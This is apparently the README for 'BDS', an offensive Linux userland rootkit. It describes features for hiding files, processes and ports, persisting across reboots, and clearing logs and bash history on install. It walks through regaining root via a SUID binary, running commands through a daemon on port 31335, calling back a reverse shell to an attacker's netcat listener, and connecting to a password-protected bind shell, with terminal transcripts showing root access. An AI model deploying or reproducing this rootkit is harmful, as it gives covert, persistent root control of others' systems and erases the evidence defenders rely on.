<h2>BDS Linux Userland Rootkit</h2>
<br>
Developed by : Antonius
<br>
Website : www.bluedragonsec.com
<br>
Github : https://github.com/bluedragonsecurity
<br>
Twitter : https://twitter.com/bluedragonsec
<p>
<h3>Features : </h3>
<ul>
  <li>Hide files and directories</li>
  <li>Hide process</li>
  <li>Hide bind shell port, bds daemon port and reverse shell port from netstat</li>
  <li>Rootkit persistence to survive after reboot</li>
  <li>clean logs and bash history during installation</li>
</ul>
</p>

<p>
<h3>Installation</h3>
<br>
In case you have installed gcc, install it by running the installer script:
<pre>
./install.sh direct
</pre>
<br>
In case you haven't installed gcc, install it by running the installer script :
<pre>
./install.sh
</pre>
</p>

<p>
<h3>Using the Rootkit</h3>
</p>

<p>
<h4>Privilege Escalation</h4>
<br>
Once the rootkit installed on the system, in case you lost root privilege, you can regain root privilege by typing :
<br>
<b>/opt/bds_elf/bds_suid</b>
<br>
<pre>
robotsoft@robotsoft:~$ id
uid=1000(robotsoft) gid=1000(robotsoft) groups=1000(robotsoft),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),999(sambashare)
robotsoft@robotsoft:~$ /opt/bds_elf/bds_suid
root@robotsoft:~# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),999(sambashare),1000(robotsoft)
root@robotsoft:~# 
</pre>
</p>

<p>
<h4>Using the Rootkit Daemon</h4>
<br>
Rootkit built in daemon is listening on port 31335.
Using the rootkit built in daemon, you can issue a reverse shell connection and executing linux command on target machine (which you have installed rootkit) remotely.
  To connect  to rootkit daemon, open your terminal and type :
  <pre>
  nc "target ip" 31335
  </pre>
<br>
Example : 
<br>
You have installed bds userland on ip address 192.168.43.36 , open terminal and type:
<pre>
robotsoft@robotsoft:~$ nc 192.168.43.36 31335
CMD :
</pre>
Type any linux command in cmd prompt
<pre>
robotsoft@robotsoft:~$ nc 192.168.43.36 31335
CMD :id
uid=0(root) gid=0(root) groups=0(root)
CMD :uname -a
Linux robotsoft 5.11.0-49-generic #55-Ubuntu SMP Wed Jan 12 17:36:34 UTC 2022 x86_64 x86_64 x86_64 GNU/Linux
CMD :pwd
/
CMD :
</pre>    
</p>

<p>
<h4>Activating Reverse Shell</h4>
<br>
<br>
To activate reverse shell, you need to set up a port listener using netcat on port 31337, then connect to bds daemon on your target server (with rootkit installed) on port 31335.
<br>
On your machine, open terminal and type:
<br>
<pre>
nc -l -p 31337 -v
</pre>  
Open another terminal tab and connect to target server on port 31335 :
<pre>
nc server ip 31335
then type : 
/opt/bds_elf/bds_bc "your ip address"
</pre>  
Wait a few seconds and you will get reverse shell port connection from your target server.
<br>
Example :
<br>
Server ip address with rootkit installed is at 192.168.43.36, your local machine ip is at 192.168.43.230.
Open terminal on your local machine and set up port listener on port 31337:
<pre>
  robotsoft@robotsoft:~$ nc -l -p 31337 -v
  Listening on 0.0.0.0 31337
</pre>
Open another terminal and connect to daemon on target machine (which you have installed rootkit) :
<pre>
robotsoft@robotsoft:~$ nc 192.168.43.36 31335
CMD :/opt/bds_elf/bds_bc 192.168.43.230
CMD :
</pre>  
Back on your previous netcat listener, you will receive a reverse shell connection : 
<pre>
root@robotsoft:~# nc -l -p 31337 -v
Listening on 0.0.0.0 31337
Connection received on 192.168.43.36 42012
Linux robotsoft-virtualbox 6.2.0-20-generic #20-Ubuntu SMP PREEMPT_DYNAMIC Thu Apr  6 07:48:48 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux robotsoft-virtualbox 6.2.0-20-generic #20-Ubuntu SMP PREEMPT_DYNAMIC Thu Apr  6 07:48:48 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
</pre>
</p>
<p>
<h4>Connecting to Bind Shell Port</h4>
<br>
Bind shell port on server (which you have installed rootkit) is at port 31337, the password is <b>bluedragonsec</b></b>.
You can connect to bind shell port using netcat :
<pre>
nc "server ip address" 31337
then type the password : bluedragonsec  
</pre>
Example :
<br>
Server ip address (with bds userland rootkit installed) is at 192.168.43.36.
<pre>
robotsoft@robotsoft:~$ nc 192.168.43.36 31337
Password :bluedragonsec
Linux robotsoft-virtualbox 6.2.0-20-generic #20-Ubuntu SMP PREEMPT_DYNAMIC Thu Apr  6 07:48:48 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
id
uid=0(root) gid=0(root) groups=0(root)
uname -a
Linux robotsoft-virtualbox 6.2.0-20-generic #20-Ubuntu SMP PREEMPT_DYNAMIC Thu Apr  6 07:48:48 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
</pre>
</p>

<p>
<h4>Hiding Files and Directories</h4>
<br>
To hide file and directory just give prefix bds_ to file name and directory name
</p>

<b>How to Clean Logs and Bash History ?</b>
<br>
Before running installation script, add username to usernames_to_clear_logs.txt in new line, example:
<pre>
root
robotsoft
</pre>
User logs will be cleaned during rootkit installation
</p>


<p>
<b>Process Hiding</b>
<br>
This rootkit hides bind shell process, reverse shell process and rootkit built-in daemon process.
</p>

<p>
<b>Port Hiding</b>
<br>
This rootkit hides bind shell port, reverse shell port and rootkit built-in daemon port.
</p>

<p>
<b>Persistence</b>
<br>
  The rootkit is activated every time the system starts up. After the reboot, wait for 2 minutes, the rootkit will be activated.
</p>


